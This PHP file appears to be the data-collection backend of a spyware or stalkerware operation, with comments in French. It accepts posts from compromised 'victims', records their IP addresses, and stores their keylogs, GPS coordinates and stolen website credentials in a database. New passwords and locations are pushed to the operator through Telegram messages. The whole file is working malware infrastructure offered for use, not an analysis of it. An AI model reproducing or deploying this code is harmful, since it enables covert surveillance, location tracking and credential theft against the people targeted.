<?php
require_once '../config.php';

// Headers CORS
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

// Gestion OPTIONS
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Lecture du body
$input = file_get_contents('php://input');
if (!$input) {
    http_response_code(400);
    die(json_encode(['error' => 'No data']));
}

$data = json_decode($input, true);
if (!$data || !isset($data['victimId']) || !isset($data['type'])) {
    http_response_code(400);
    die(json_encode(['error' => 'Invalid data']));
}

$victimId = $data['victimId'];
$type = $data['type'];
$content = $data['data'] ?? null;
$priority = $data['priority'] ?? 'normal';

// Vérifier victime
try {
    $stmt = $pdo->prepare("SELECT id FROM victims WHERE id = ?");
    $stmt->execute([$victimId]);
    $victim = $stmt->fetch();
    
    if (!$victim) {
        // Création automatique
        $stmt = $pdo->prepare("INSERT INTO victims (id, ip, first_seen, last_seen) VALUES (?, ?, NOW(), NOW())");
        $stmt->execute([$victimId, getClientIP()]);
    } else {
        // Mise à jour
        $stmt = $pdo->prepare("UPDATE victims SET last_seen = NOW() WHERE id = ?");
        $stmt->execute([$victimId]);
    }
    
    // Sauvegarde des données
    $stmt = $pdo->prepare("INSERT INTO data (victim_id, type, content) VALUES (?, ?, ?)");
    $stmt->execute([$victimId, $type, json_encode($content)]);
    
    // Traitement spécial pour la localisation
    if ($type === 'location' && isset($content['lat']) && isset($content['lng'])) {
        $stmt = $pdo->prepare("INSERT INTO locations (victim_id, lat, lng, accuracy, source) VALUES (?, ?, ?, ?, ?)");
        $stmt->execute([
            $victimId,
            $content['lat'],
            $content['lng'],
            $content['accuracy'] ?? 0,
            $content['source'] ?? 'gps'
        ]);
    }
    
    // Traitement spécial pour les keylogs
    if ($type === 'keylog' && is_array($content)) {
        foreach ($content as $key) {
            $stmt = $pdo->prepare("INSERT INTO keylogs (victim_id, key_data) VALUES (?, ?)");
            $stmt->execute([$victimId, $key['key'] ?? '']);
        }
    }
    
    // Traitement spécial pour les credentials
    if ($type === 'credentials' || $type === 'password') {
        $stmt = $pdo->prepare("INSERT INTO credentials (victim_id, site, username, password, url) VALUES (?, ?, ?, ?, ?)");
        $stmt->execute([
            $victimId,
            $content['site'] ?? $content['url'] ?? 'unknown',
            $content['email'] ?? $content['username'] ?? '',
            $content['password'] ?? $content['value'] ?? '',
            $content['url'] ?? ''
        ]);
        
        // Notification haute priorité
        if ($priority === 'high') {
            $message = "🔑 **NOUVEAU MOT DE PASSE**\n";
            $message .= "🆔 $victimId\n";
            $message .= "🌐 " . ($content['site'] ?? $content['url'] ?? 'unknown') . "\n";
            $message .= "👤 " . ($content['email'] ?? $content['username'] ?? '') . "\n";
            $message .= "🔐 " . ($content['password'] ?? $content['value'] ?? '');
            
            sendToTelegram($message);
        }
    }
    
    // Notification Telegram pour les infos importantes
    if ($type === 'location' && $priority === 'high') {
        $message = "📍 **NOUVELLE LOCALISATION**\n";
        $message .= "🆔 $victimId\n";
        $message .= "🌍 {$content['lat']}, {$content['lng']}\n";
        $message .= "🎯 Précision: {$content['accuracy']}m\n";
        $message .= "🗺️ https://maps.google.com/?q={$content['lat']},{$content['lng']}";
        
        sendToTelegram($message);
    }
    
    logActivity("[$victimId] Donnée reçue: $type (" . strlen(json_encode($content)) . " bytes)");
    
    echo json_encode(['success' => true]);
    
} catch (Exception $e) {
    logActivity("Erreur API collect: " . $e->getMessage(), 'error');
    http_response_code(500);
    echo json_encode(['error' => 'Server error']);
}
?>
